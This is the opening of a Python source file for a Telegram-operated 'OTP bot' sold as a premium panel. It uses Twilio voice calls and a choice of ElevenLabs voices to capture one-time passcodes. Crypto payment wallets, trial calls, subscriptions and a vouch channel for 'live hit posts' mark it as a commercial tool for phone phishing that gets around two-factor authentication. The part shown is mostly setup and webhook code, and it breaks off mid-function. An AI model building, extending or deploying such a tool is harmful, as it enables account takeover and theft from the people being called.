#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HOTTBOIIHITZZ PREMIUM PANEL — ULTIMATE OTP BOT v4.1
Fully debugged with file lock fixes, script creation, OTP capture,
and complete error feedback.

=============================================================================
CRITICAL: TWILIO WEBHOOK CONFIGURATION
=============================================================================

To make the bot work with Twilio:

1. CREDENTIALS REQUIRED (in .env or conf/settings.txt):
   - TWILIO_ACCOUNT_SID: Your Twilio Account SID (starts with 'AC')
   - TWILIO_AUTH_TOKEN: Your Twilio Auth Token (64 character token)
   - TWILIO_PHONE_NUMBER: Your Twilio phone number (e.g., +1234567890)
   - NGROK_URL: Your ngrok URL (e.g., https://abc123.ngrok-free.dev)

2. CONFIGURE WEBHOOKS IN TWILIO CONSOLE:
   Go to: https://www.twilio.com/console/phone-numbers/incoming
   - Select your phone number
   - Under "Voice & Fax":
     * A Call Comes In → Webhook
     * URL: {NGROK_URL}/voice
     * Method: HTTP POST
   - Configure Status Callback:
     * URL: {NGROK_URL}/twilio/status
     * Method: HTTP POST

3. VERIFY YOUR CONFIGURATION:
   - Make sure NGROK_URL matches exactly what you configured in Twilio
   - The X-Twilio-Signature header will be validated against AUTH_TOKEN
   - If validation fails 401, check the debug logs with timestamps

4. TROUBLESHOOTING:
   - If you see "application error" → check logs for 401 errors
   - Enable DISABLE_TWILIO_VALIDATION=true temporarily to test
   - Check ngrok status: ngrok_url should be active and match webhook URL
   - Verify AUTH_TOKEN is correct (not truncated)

5. DEBUG MODE:
   - Set DEBUG=true in .env to see all request details
   - Check conf/twilio_live_calls.log for all webhook calls

=============================================================================
"""
import json
import os
import secrets
import string
import time
import threading
from collections import deque
from concurrent.futures import ThreadPoolExecutor
import sqlite3
import csv
import re
import base64
import hashlib
import html
import random
import uuid
import tempfile
import logging
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any, Union, Callable
from collections import defaultdict
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import quote_plus, urlparse

import requests
import socket
import asyncio
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import telebot
from flask import Flask, request, send_file, Response
from telebot import types
from twilio.rest import Client
from twilio.base.exceptions import TwilioRestException
from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Say, Redirect, Start
from twilio.request_validator import RequestValidator
from requests.auth import HTTPBasicAuth
from gtts import gTTS
from dotenv import load_dotenv
from handlers.call_flow import amd_callback_flask
from telebot.apihelper import ApiTelegramException
import config as app_config

_http = requests.Session()
_http_retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
_http.mount("https://", HTTPAdapter(max_retries=_http_retries, pool_connections=10, pool_maxsize=20))
_http.mount("http://", HTTPAdapter(max_retries=_http_retries, pool_connections=10, pool_maxsize=20))
REQ_TIMEOUT = (5, 10)  # connect_timeout, read_timeout

# ======================================================================
# CONFIGURATION
# ======================================================================
load_dotenv()

SETTINGS_FILE = Path(__file__).parent / "conf" / "settings.txt"
LOG_DIR = Path(__file__).parent / "conf"
TWILIO_REQUEST_LOG = LOG_DIR / "twilio_live_calls.log"

# Ensure Twilio request log exists from startup so errors are easier to find.
try:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    if not TWILIO_REQUEST_LOG.exists():
        TWILIO_REQUEST_LOG.write_text("", encoding="utf-8")
    logging.getLogger(__name__).info(f"Twilio live log initialized at {TWILIO_REQUEST_LOG}")
except Exception as e:
    logging.getLogger(__name__).warning(f"Failed to initialize Twilio live log: {e}")


def _load_settings():
    if not SETTINGS_FILE.exists():
        return {}
    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

_settings = _load_settings()

def _get(key, default=None):
    return os.getenv(key) or _settings.get(key) or default

# Telegram
BOT_TOKEN = _get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
# Twilio
ACCOUNT_SID = _get("TWILIO_ACCOUNT_SID", "YOUR_TWILIO_SID_HERE")
AUTH_TOKEN = _get("TWILIO_AUTH_TOKEN", "YOUR_TWILIO_AUTH_TOKEN_HERE")
TWILIO_PHONE_NUMBER = _get("TWILIO_PHONE_NUMBER", "+1234567890")
NGROK_URL = _get("NGROK_URL", "https://your-ngrok-url.ngrok-free.dev")
NGROK_TOKEN = _get("NGROK_TOKEN", "")
# Channels
MAIN_CHANNEL_URL = _get("MAIN_CHANNEL_URL", "https://t.me/your_main_channel")
BACKUP_CHANNEL_URL = _get("BACKUP_CHANNEL_URL", "https://t.me/your_backup_channel")
VOUCH_CHANNEL_URL = _get("VOUCH_CHANNEL_URL", "https://t.me/your_vouch_channel")
MAIN_CHANNEL_ID = _get("MAIN_CHANNEL_ID", "")
BACKUP_CHANNEL_ID = _get("BACKUP_CHANNEL_ID", "")
VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
# Admins
OWNER_ID = _get("OWNER_ID", app_config.OWNER_ID)
if OWNER_ID is not None:
    try:
        OWNER_ID = int(OWNER_ID)
    except:
        OWNER_ID = None
ADMIN_ID = _get("ADMIN_ID", app_config.ADMIN_ID)
if ADMIN_ID is not None:
    try:
        ADMIN_ID = int(ADMIN_ID)
    except:
        ADMIN_ID = None
DEVELOPER_IDS_STR = _get("DEVELOPER_IDS", "")
DEVELOPER_IDS = []
if DEVELOPER_IDS_STR:
    for pid in str(DEVELOPER_IDS_STR).split(","):
        pid = pid.strip()
        if pid and pid.isdigit():
            DEVELOPER_IDS.append(int(pid))
elif getattr(app_config, "DEVELOPER_IDS", None):
    DEVELOPER_IDS = [int(pid) for pid in app_config.DEVELOPER_IDS if str(pid).strip().isdigit()]
# Free trial
FREE_TRIAL_TOTAL = int(_get("FREE_TRIAL_CALLS", "5"))
# Payment addresses
PAYMENT_ADDRESSES = {
    "BTC": _get("PAYMENT_BTC", "YOUR_WALLET_ADDRESS_HERE"),
    "ETH": _get("PAYMENT_ETH", "YOUR_WALLET_ADDRESS_HERE"),
    "LTC": _get("PAYMENT_LTC", "YOUR_WALLET_ADDRESS_HERE"),
    "USDT_ERC20": _get("PAYMENT_USDT", "YOUR_WALLET_ADDRESS_HERE"),
}
# ElevenLabs
ELEVENLABS_API_KEY = _get("ELEVENLABS_API_KEY", "YOUR_ELEVENLABS_API_KEY_HERE")
# Live Listen
LIVE_LISTEN_URL = _get("LIVE_LISTEN_URL", NGROK_URL)
LIVE_LISTEN_SECRET = _get("LIVE_LISTEN_SECRET", "")
# Twilio validation override
DISABLE_TWILIO_VALIDATION = _get("DISABLE_TWILIO_VALIDATION", "false").lower() in ("true", "1", "yes")
# Disable DummyBot fallback in production or when explicitly requested
DISABLE_DUMMY_BOT = _get("DISABLE_DUMMY_BOT", "false").lower() in ("true", "1", "yes")
# Vouches channel for live hit posts
VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
# Abstract API (carrier lookup)
ABSTRACT_API_KEY = _get("ABSTRACT_API_KEY", "")
# Rate limiter
RATE_LIMIT_CAPACITY = int(_get("RATE_LIMIT_CAPACITY", 10))
RATE_LIMIT_REFILL_RATE = float(_get("RATE_LIMIT_REFILL_RATE", 1.0))
RATE_LIMIT_MAX_VIOLATIONS = int(_get("RATE_LIMIT_MAX_VIOLATIONS", 5))
RATE_LIMIT_BASE_BAN_DURATION = int(_get("RATE_LIMIT_BASE_BAN_DURATION", 300))
RATE_LIMIT_MAX_BAN_DURATION = int(_get("RATE_LIMIT_MAX_BAN_DURATION", 86400))
RATE_LIMIT_BAN_ESCALATION_FACTOR = float(_get("RATE_LIMIT_BAN_ESCALATION_FACTOR", 2.0))
# Server
FLASK_HOST = _get("FLASK_HOST", "0.0.0.0")
FLASK_PORT = int(_get("FLASK_PORT", 5000))
DEBUG = _get("DEBUG", "false").lower() in ("true", "1", "yes")

# Telegram webhook mode
USE_WEBHOOK = _get("USE_WEBHOOK", "false").lower() in ("true", "1", "yes")
WEBHOOK_URL = _get("WEBHOOK_URL", "").strip()
WEBHOOK_PATH = _get("WEBHOOK_PATH", "/telegram_webhook").strip()
TELEGRAM_API_BASE_URL = _get(
    "TELEGRAM_API_BASE_URL",
    "https://tg-api-proxy.zaddocklangat8.workers.dev/bot"
).rstrip("/")

# Derived channel IDs
def _derive_channel_id(url, fallback):
    if fallback:
        return fallback
    if not url:
        return None
    url = url.strip().rstrip("/")
    if url.endswith("t.me"):
        return None
    last = url.split("/")[-1]
    if not last:
        return None
    if last.startswith("@"):
        return last
    if last.startswith("+"):
        return url
    return "@" + last

MAIN_CHANNEL_ID = _derive_channel_id(MAIN_CHANNEL_URL, MAIN_CHANNEL_ID)
BACKUP_CHANNEL_ID = _derive_channel_id(BACKUP_CHANNEL_URL, BACKUP_CHANNEL_ID)
VOUCH_CHANNEL_ID = _derive_channel_id(VOUCH_CHANNEL_URL, VOUCH_CHANNEL_ID)
REQUIRED_CHANNELS = [ch for ch in [MAIN_CHANNEL_ID, BACKUP_CHANNEL_ID, VOUCH_CHANNEL_ID] if ch]

# ======================================================================
# LOGGING
# ======================================================================
logger = logging.getLogger("HOTTBOIIHITZZ")
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler(sys.stdout)
ch.setLevel(logging.INFO)
ch.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(ch)
fh = logging.FileHandler("bot.log", encoding="utf-8")
fh.setLevel(logging.DEBUG)
fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(fh)

# ======================================================================
# IMPORT VERIFICATION SYSTEM
# ======================================================================
from verification import (
    create_verification_request,
    find_user_pending_verification,
    add_proof_to_verification,
    approve_verification,
    get_pending_verifications,
    get_verification_by_id,
    format_verification_for_admin,
)

# ======================================================================
# IMPORT USER MANAGER
# ======================================================================
from core.user_manager import (
    add_user_if_not_exists,
    update_last_activity,
    set_user_premium,
    set_user_subscription_end_date,
    extend_subscription,
    is_premium,
    get_subscription_end_date,
    get_all_users_with_status,
    get_user_info,
    get_free_vs_premium_count,
    reset_expired_subscriptions,
    init_user_db,
)

# ======================================================================
# GLOBAL CLIENTS
# ======================================================================
# Prefer services wrapper for Twilio call dispatch to ensure non-blocking behaviour
from services.twilio_service import make_call_async, make_call_and_store_async, get_twilio_client

twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN) if ACCOUNT_SID and "YOUR_" not in ACCOUNT_SID else None
# Initialize bot with threaded=True for better concurrency and timeout handling
bot = telebot.TeleBot(
    BOT_TOKEN,
    threaded=True,  # ✅ Enable threading for non-blocking operations
    num_threads=10  # ✅ Larger pool for concurrent handlers and background tasks
) if BOT_TOKEN and "YOUR_" not in BOT_TOKEN else None
if bot:
    import telebot.apihelper
    telebot.apihelper.READ_TIMEOUT = 90
    telebot.apihelper.CONNECT_TIMEOUT = 30
    api_base = TELEGRAM_API_BASE_URL.rstrip("/")
    telebot.apihelper.API_URL = f"{api_base}{{0}}/{{1}}"
    telebot.apihelper.FILE_URL = f"{api_base}{{0}}/{{1}}"
app = Flask(__name__)

# Ensure the user database is ready on startup.
def _startup_diagnostics():
    """Check and log configuration status on startup."""
    from config import DATABASE_URL, USE_POSTGRES
    
    logger.info("\n" + "="*70)
    logger.info("🔧 STARTUP DIAGNOSTICS")
    logger.info("="*70)
    
    if USE_POSTGRES and DATABASE_URL:
        logger.info("✅ DATABASE_URL: Configured")
        logger.info("   → PostgreSQL user persistence: ENABLED")
        logger.info("   → Users will persist across bot restarts")
        logger.info("   → Premium status updates will work")
    else:
        logger.error("❌ DATABASE_URL: NOT CONFIGURED")
        logger.error("   → PostgreSQL user persistence: DISABLED")
        logger.error("   → Users will NOT persist (lost on bot restart)")
        logger.error("   → Premium status updates will NOT work")
        logger.error("   → VIEW USERS button will show: 'No users found'")
        logger.error("")
        logger.error("   FIX: Set DATABASE_URL in Railway environment variables")
        logger.error("   Then restart the bot")
    
    logger.info("="*70 + "\n")

try:
    init_user_db()
    _startup_diagnostics()
except Exception:
    logger.exception("Failed to initialize user database")

# When running without a real `BOT_TOKEN` (for example in CI or a public
# deployment without secrets), provide a lightweight `DummyBot` that
# implements the TeleBot handler decorator API and common methods as
# no-ops. This prevents import-time decorator usage (e.g. `@bot.message_handler`)
# from raising AttributeError when `bot` would otherwise be `None`.
class DummyBot:
    def __init__(self):
        self._stored_handlers = []

    def _noop_decorator(self, *args, **kwargs):
        def _decorator(func):
            return func
        return _decorator

    def message_handler(self, *args, **kwargs):
        return self._noop_decorator(*args, **kwargs)

    def callback_query_handler(self, *args, **kwargs):
        return self._noop_decorator(*args, **kwargs)

    def inline_handler(self, *args, **kwargs):
        return self._noop_decorator(*args, **kwargs)

    def chat_member_handler(self, *args, **kwargs):
        return self._noop_decorator(*args, **kwargs)

    # Compatibility stubs used by the codebase
    def add_message_handler(self, handler_dict):
        return None

    def add_callback_query_handler(self, handler_dict):
        return None

    def add_chat_member_handler(self, handler_dict):
        return None

    def send_message(self, *args, **kwargs):
        return None

    def edit_message_text(self, *args, **kwargs):
        return None

    def reply_to(self, *args, **kwargs):
        return None

    def send_audio(self, *args, **kwargs):
        return None

    def send_document(self, *args, **kwargs):
        return None

    def remove_webhook(self):
        return None

    def set_webhook(self, *args, **kwargs):
        return True

    def process_new_updates(self, updates):
        return None

    def polling(self, *args, **kwargs):
        return None

    def stop_polling(self):
        return None

    def __getattr__(self, name):
        # Return a no-op callable for any other attribute access to remain
        # tolerant of unexpected API usage.
        def _noop(*a, **k):
            return None
        return _noop


if bot is None:
    if DISABLE_DUMMY_BOT:
        logger.error("BOT_TOKEN missing or placeholder and DISABLE_DUMMY_BOT=1 — exiting to avoid fallback to DummyBot.")
        sys.exit(1)
    logger.warning("BOT_TOKEN missing or placeholder — using DummyBot. Handlers are no-ops until a real token is provided. To disallow this fallback set DISABLE_DUMMY_BOT=1 in your environment.")
    bot = DummyBot()

@app.route('/health', methods=['GET'])
def health_check():
    return {"status": "ok"}, 200

# Polling health state
_polling_thread = None
_polling_watchdog_thread = None
_polling_stop_event = threading.Event()
_webhook_mode_active = False
_ngrok_watcher_thread = None


def should_start_polling() -> bool:
    """Return True when the bot should run the Telegram polling loop."""
    return bool(bot) and not USE_WEBHOOK and not _webhook_mode_active


def mark_webhook_mode(active: bool) -> None:
    global _webhook_mode_active
    _webhook_mode_active = bool(active)
    if active:
        logger.info("Webhook mode marked active; polling will remain disabled.")
    else:
        logger.debug("Webhook mode marked inactive; polling may start if enabled.")


def _normalize_url_base(url: str) -> Optional[str]:
    if not url:
        return None
    parsed = requests.utils.urlparse(url.strip())
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        return None
    return f"{parsed.scheme}://{parsed.netloc}"


def _validate_webhook_host(host: str) -> bool:
    if not host:
        logger.error("Webhook host is empty.")
        return False
    try:
        socket.getaddrinfo(host, None)
        return True
    except Exception as e:
        logger.warning(f"Could not resolve webhook host '{host}': {e}")
        return False


def wait_for_public_webhook_dns(host: str, timeout: int = 60, interval: float = 5.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _validate_webhook_host(host):
            logger.info("Public webhook host resolved: %s", host)
            return True
        logger.warning("Public webhook host %s not yet resolvable. Retrying in %ss...", host, interval)
        time.sleep(interval)
    logger.error("Timed out waiting for public webhook host %s to resolve.", host)
    return False


def _is_running_in_railway_or_container() -> bool:
    """Detect if running in Railway, Docker, or other container environment."""
    # Check for Railway environment variables
    if os.getenv("RAILWAY_ENVIRONMENT") or os.getenv("RAILWAY_STATIC_URL"):
        return True
    # Check for Docker
    if os.path.exists("/.dockerenv"):
        return True
    # Check for PORT environment variable (Railway-specific)
    if os.getenv("PORT") and os.getenv("PORT") != "5000":
        return True
    return False


def wait_for_local_webhook_endpoint(path: str, timeout: int = 20, interval: float = 2.0) -> bool:
    """Wait for local webhook endpoint to be reachable.
    
    Skips the check when running in Railway/Docker with a public webhook URL,
    since Flask is mounted to FastAPI and won't be on localhost:5000.
    """
    # Skip local check if running in container and we have a public webhook URL
    if _is_running_in_railway_or_container():
        logger.info("Running in Railway/container; skipping local endpoint reachability check (Flask is mounted to FastAPI)")
        return True
    
    local_url = f"http://127.0.0.1:{FLASK_PORT}{path}"
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            response = requests.get(local_url, timeout=5)
            if response.status_code < 500:
                logger.info(f"Local webhook endpoint is reachable: {local_url} status={response.status_code}")
                return True
            logger.warning(
                "Local webhook endpoint returned status %s while waiting for readiness. Retrying...",
                response.status_code,
            )
        except requests.RequestException as exc:
            logger.warning("Local webhook endpoint not reachable yet (%s): %s", local_url, exc)
        time.sleep(interval)
    logger.error("Timed out waiting for local webhook endpoint %s to become reachable.", local_url)
    return False


def wait_for_webhook_endpoint(url: str, timeout: int = 20, interval: float = 2.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            response = requests.get(url, timeout=5, allow_redirects=False)
            if response.status_code < 500:
                logger.info(f"Remote webhook endpoint is reachable: {url} status={response.status_code}")
                return True
            logger.warning(
                "Remote webhook endpoint returned status %s while waiting for readiness. Retrying...",
                response.status_code,
            )
        except requests.RequestException as exc:
            logger.warning("Remote webhook endpoint not reachable yet (%s): %s", url, exc)
        time.sleep(interval)
    logger.warning("Remote webhook endpoint did not become reachable within %s seconds: %s", timeout, url)
    return False


def get_telegram_webhook_url() -> Optional[str]:
    if WEBHOOK_URL:
        base = _normalize_url_base(WEBHOOK_URL)
        if base:
            return base
        logger.error("WEBHOOK_URL is not a valid http/https URL.")
    if NGROK_URL:
        base = _normalize_url_base(NGROK_URL)
        if base:
            return base
        logger.error("NGROK_URL is not a valid http/https URL.")
    return None


def set_telegram_webhook() -> bool:
    if bot is None:
        logger.error("Telegram bot not configured. Cannot set webhook.")
        mark_webhook_mode(False)
        return False
    url_base = get_telegram_webhook_url()
    if not url_base:
        logger.error("No valid WEBHOOK_URL or NGROK_URL configured for Telegram webhook.")
        mark_webhook_mode(False)
        return False
    path = WEBHOOK_PATH if WEBHOOK_PATH.startswith("/") else f"/{WEBHOOK_PATH}"
    webhook_url = f"{url_base}{path}"

    parsed = urlparse(webhook_url)
    if not parsed.hostname:
        logger.error("Telegram webhook URL parsing failed. Check WEBHOOK_URL and WEBHOOK_PATH.")
        mark_webhook_mode(False)
        return False

    # Ensure local webhook handler is up before registering with Telegram.
    # If the local endpoint is reachable, skip the external NGROK/public URL check
    # to avoid unnecessary public requests when running locally behind a tunnel.
    if not wait_for_local_webhook_endpoint(path, timeout=20, interval=2.0):
        logger.error("Local webhook route is not ready. Ensure your bot is fully started before setting Telegram webhook.")
        mark_webhook_mode(False)
        return False

    logger.info("Local webhook endpoint verified; skipping remote NGROK/public URL reachability check.")

    try:
        bot.remove_webhook()
    except Exception as e:
        logger.debug(f"Could not remove existing webhook: {e}")

    for attempt in range(3):
        try:
            success = bot.set_webhook(
                url=webhook_url,
                allowed_updates=["message", "callback_query", "chat_member"],
            )
            if success:
                logger.info(f"Telegram webhook set to {webhook_url}")
                mark_webhook_mode(True)
                return True
            logger.error("Telegram webhook setup returned False")
            break
        except Exception as e:
            msg = str(e).lower()
            if attempt < 2 and "failed to resolve host" in msg:
                logger.warning(
                    "Telegram set_webhook failed due to DNS resolution. Retrying in 5s... (%s)",
                    e,
                )
                time.sleep(5)
                continue
            logger.error(f"Failed to set Telegram webhook: {e}", exc_info=True)
            break
    mark_webhook_mode(False)
    return False


def force_delete_telegram_webhook(retries: int = 3, backoff: float = 2.0) -> bool:
    """Force-delete any Telegram webhook using the HTTP API as a fallback.

    This is used to ensure polling can start even if the library's
    `remove_webhook()` doesn't clear the webhook on Telegram's side.
    """
    if bot is None:
        logger.debug("Bot not configured; cannot delete webhook via API.")
        return False
    if not BOT_TOKEN or "YOUR_BOT_TOKEN" in BOT_TOKEN:
        logger.debug("BOT_TOKEN missing or placeholder; skipping force delete.")
        return False

    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
    params = {"drop_pending_updates": "true"}
    for attempt in range(1, retries + 1):
        try:
            resp = _http.get(api_url, params=params, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    logger.info("Successfully deleted Telegram webhook via API.")
                    mark_webhook_mode(False)
                    return True
                logger.warning("Telegram deleteWebhook returned ok=false: %s", data)
            else:
                logger.warning("Telegram deleteWebhook HTTP %s: %s", resp.status_code, resp.text)
        except Exception as e:
            logger.warning("Failed calling Telegram deleteWebhook (attempt %s): %s", attempt, e)
        time.sleep(backoff)
    logger.error("Could not delete Telegram webhook via API after %s attempts.", retries)
    return False


def _query_ngrok_public_url(port: int = 4040) -> Optional[str]:
    try:
        resp = requests.get(f"http://127.0.0.1:{port}/api/tunnels", timeout=3)
        resp.raise_for_status()
        data = resp.json()
        for t in data.get("tunnels", []):
            if t.get("proto") == "https" and t.get("public_url"):
                return t.get("public_url")
        for t in data.get("tunnels", []):
            if t.get("public_url"):
                return t.get("public_url")
    except Exception:
        return None


def _atomic_update_env_key(key: str, value: str) -> None:
    env_path = Path(__file__).parent / ".env"
    try:
        text = env_path.read_text(encoding="utf-8") if env_path.exists() else ""
        lines = text.splitlines()
        new_lines = []
        found = False
        for line in lines:
            if line.strip().startswith(f"{key}="):
                new_lines.append(f"{key}={value}")
                found = True
            else:
                new_lines.append(line)
        if not found:
            new_lines.append(f"{key}={value}")
        content = "\n".join(new_lines)
        if content and not content.endswith("\n"):
            content += "\n"
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", dir=str(env_path.parent), delete=False) as fh:
            fh.write(content)
            temp = Path(fh.name)
        os.replace(str(temp), str(env_path))
    except Exception as e:
        logger.warning(f"Failed to update .env {key}: {e}")


def _atomic_update_settings_ngrok(base: str) -> None:
    settings_path = Path(__file__).parent / "conf" / "settings.txt"
    try:
        data = {}
        if settings_path.exists():
            with open(settings_path, "r", encoding="utf-8") as f:
                data = json.load(f)
        data["ngrok_url"] = base
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", dir=str(settings_path.parent), delete=False) as fh:
            json.dump(data, fh, indent=2)
            temp = Path(fh.name)
        os.replace(str(temp), str(settings_path))
    except Exception as e:
        logger.warning(f"Failed to update conf/settings.txt: {e}")


def _ngrok_watcher_loop(interval: int = 30, port: int = 4040) -> None:
    global NGROK_URL, WEBHOOK_URL
    while True:
        try:
            public = _query_ngrok_public_url(port)
            if public:
                base = _normalize_url_base(public) or public
                if base and base != NGROK_URL:
                    logger.info(f"Ngrok watcher: detected ngrok change {NGROK_URL} -> {base}")
                    NGROK_URL = base
                    WEBHOOK_URL = base
                    _atomic_update_env_key("NGROK_URL", base)
                    _atomic_update_env_key("WEBHOOK_URL", base)
                    _atomic_update_settings_ngrok(base)
                    try:
                        mark_webhook_mode(False)
                        if set_telegram_webhook():
                            logger.info("Ngrok watcher: setWebhook succeeded")
                        else:
                            logger.warning("Ngrok watcher: setWebhook failed")
                    except Exception as e:
                        logger.error(f"Ngrok watcher: setWebhook raised: {e}", exc_info=True)
        except Exception as e:
            logger.error(f"Ngrok watcher loop error: {e}", exc_info=True)
        time.sleep(interval)


def start_ngrok_watcher(interval: int = 30, port: int = 4040) -> None:
    global _ngrok_watcher_thread
    if _ngrok_watcher_thread and _ngrok_watcher_thread.is_alive():
        return
    _ngrok_watcher_thread = threading.Thread(target=_ngrok_watcher_loop, args=(interval, port), daemon=True, name="NgrokWatcherThread")
    _ngrok_watcher_thread.start()


@app.route(WEBHOOK_PATH, methods=["GET", "POST"])
def telegram_webhook():
    if bot is None:
        return Response("Bot not configured", status=500)
    if request.method == "GET":
        return Response("Telegram webhook endpoint is active", status=200)
    try:
        json_str = request.get_data().decode("utf-8")
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
    except Exception as e:
        logger.error(f"Telegram webhook processing error: {e}", exc_info=True)
        return Response("Error", status=500)
    return Response("OK", status=200)

# Safe wrappers for bot API methods with auto-retry on network errors
if bot:
    import functools as _ft
    def _safe_send(func):
        @_ft.wraps(func)
        def wrapper(*args, **kwargs):
            for attempt in range(3):
                try:
                    return func(*args, **kwargs)
                except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout, ConnectionResetError) as e:
                    if attempt < 2:
                        delay = 1 * (2 ** attempt)
                        logger.debug(f"Retry {attempt+2}/3: {e}")
                        time.sleep(delay)
                    else:
                        logger.error(f"Send failed after 3 attempts: {e}")
                        raise
        return wrapper
    bot.send_message = _safe_send(bot.send_message)
    bot.edit_message_text = _safe_send(bot.edit_message_text)
    bot.reply_to = _safe_send(bot.reply_to)
    bot.send_audio = _safe_send(bot.send_audio)
    bot.send_document = _safe_send(bot.send_document)

    # Wrap all handlers with try/except so exceptions don't crash polling
    _orig_add_msg = bot.add_message_handler
    _orig_add_cb = bot.add_callback_query_handler
    def _safe_handler_wrapper(orig_add):
        def _add_safe(handler_dict):
            cb = handler_dict['function']
            @_ft.wraps(cb)
            def _safe_cb(*args, **kwargs):
                try:
                    return cb(*args, **kwargs)
                except Exception as e:
                    logger.error(f"Handler error: {e}", exc_info=True)
                    return None
            handler_dict['function'] = _safe_cb
            return orig_add(handler_dict)
        return _add_safe
    bot.add_message_handler = _safe_handler_wrapper(_orig_add_msg)
    bot.add_callback_query_handler = _safe_handler_wrapper(_orig_add_cb)
    try:
        bot.add_chat_member_handler = _safe_handler_wrapper(bot.add_chat_member_handler)
    except AttributeError:
        pass

# ======================================================================
# ASYNC CALLBACK HANDLER HELPER
# ======================================================================
_callback_executor = ThreadPoolExecutor(
    max_workers=max(8, min(32, (os.cpu_count() or 1) * 4)),
    thread_name_prefix="callback"
)


def run_callback_async(func, *args, **kwargs):
    """Run callback work on a reusable background executor so button presses stay responsive."""
    try:
        return _callback_executor.submit(func, *args, **kwargs)
    except Exception as e:
        logger.error(f"Callback executor submit failed: {e}", exc_info=True)
        try:
            func(*args, **kwargs)
        except Exception as inner_error:
            logger.error(f"Fallback callback execution failed: {inner_error}", exc_info=True)
            return None


logger.info("Callback executor initialized")

# ElevenLabs
eleven_client = None
ELEVENLABS_MODEL = _get("ELEVENLABS_MODEL", "eleven_turbo_v2")
if ELEVENLABS_API_KEY:
    try:
        from elevenlabs.client import ElevenLabs
        import httpx
        http_client = httpx.Client(timeout=httpx.Timeout(15.0, connect=10.0))
        eleven_client = ElevenLabs(api_key=ELEVENLABS_API_KEY, httpx_client=http_client)
        logger.info("[OK] ElevenLabs client initialized successfully")
    except Exception as e:
        logger.error(f"ElevenLabs client error: {e}")
else:
    logger.warning("ElevenLabs API key not set — voice generation will use Twilio TTS fallback")

# ======================================================================
# VOICE MAPPING (20 voices)
# ======================================================================
VOICE_MAPPING = {
    "1": {"name": "Roger - Laid-Back, Casual, Resonant", "id": "CwhRBWXzGAHq8TQ4Fs17", "desc": "Laid-back, casual, resonant male"},
    "2": {"name": "Sarah - Mature, Reassuring, Confident", "id": "EXAVITQu4vr4xnSDxMaL", "desc": "Warm mature female with steady confidence"},
    "3": {"name": "Laura - Enthusiast, Quirky Attitude", "id": "FGY2WhTYpPnrIDTdsKH5", "desc": "Quirky, energetic female with charm"},
    "4": {"name": "Charlie - Deep, Confident, Energetic", "id": "IKne3meq5aSn9XLyUdCD", "desc": "Deep, confident male with energy"},
    "5": {"name": "George - Warm, Captivating Storyteller", "id": "JBFqnCBsd6RMkjVDRZzb", "desc": "Warm storytelling male voice"},
    "6": {"name": "Callum - Husky Trickster", "id": "N2lVS1w4EtoT3dr4eOWO", "desc": "Husky male voice with playful edge"},
    "7": {"name": "River - Relaxed, Neutral, Informative", "id": "SAz9YHcvj6GT2YYXdXww", "desc": "Relaxed informative voice"},
    "8": {"name": "Harry - Fierce Warrior", "id": "SOYHLrjzK2X1ezoPC6cr", "desc": "Bold energetic male voice"},
    "9": {"name": "Liam - Energetic, Social Media Creator", "id": "TX3LPaxmHKxFdv7VOQHJ", "desc": "Energetic modern male voice"},
    "10": {"name": "Alice - Clear, Engaging Educator", "id": "Xb7hH8MSUJpSbSDYk0k2", "desc": "Clear, engaging female educator"},
    "11": {"name": "Matilda - Knowledgable, Professional", "id": "XrExE9yKIg1WjnnlVkGX", "desc": "Professional female with authority"},
    "12": {"name": "Will - Relaxed Optimist", "id": "bIHbv24MWmeRgasZH58o", "desc": "Relaxed, optimistic male"},
    "13": {"name": "Jessica - Playful, Bright, Warm", "id": "cgSgspJ2msm6clMCkdW9", "desc": "Playful bright female voice"},
    "14": {"name": "Eric - Smooth, Trustworthy", "id": "cjVigY5qzO86Huf0OWal", "desc": "Smooth trustworthy male"},
    "15": {"name": "Bella - Professional, Bright, Warm", "id": "hpp4J3VqNfWAUOO0d1Us", "desc": "Bright professional female"},
    "16": {"name": "Chris - Charming, Down-to-Earth", "id": "iP95p4xoKVk53GoZ742B", "desc": "Charming down-to-earth male"},
    "17": {"name": "Brian - Deep, Resonant and Comforting", "id": "nPczCjzI2devNBz1zQrb", "desc": "Deep resonant comforting male"},
    "18": {"name": "Daniel - Steady Broadcaster", "id": "onwK4e9ZLuTAKqWW03F9", "desc": "Steady broadcaster male"},
    "19": {"name": "Lily - Velvety Actress", "id": "pFZP5JQG7iQjIQuC4Bku", "desc": "Velvety actress voice"},
    "20": {"name": "Adam - Dominant, Firm", "id": "pNInz6obpgDQGcFmaJgB", "desc": "Dominant firm male"},
}
logger.info(f"[VOICES] {len(VOICE_MAPPING)} voices loaded — default: {VOICE_MAPPING['1']['name']} ({VOICE_MAPPING['1']['id']})")

def get_default_voice_id() -> str:
    default_voice = VOICE_MAPPING.get("1", {}).get("id")
    if default_voice:
        return default_voice
    for voice in VOICE_MAPPING.values():
        if voice.get("id"):
            return voice["id"]
    return ""


def resolve_voice_id(user_id: str, file_name: str = "Voice.txt") -> str:
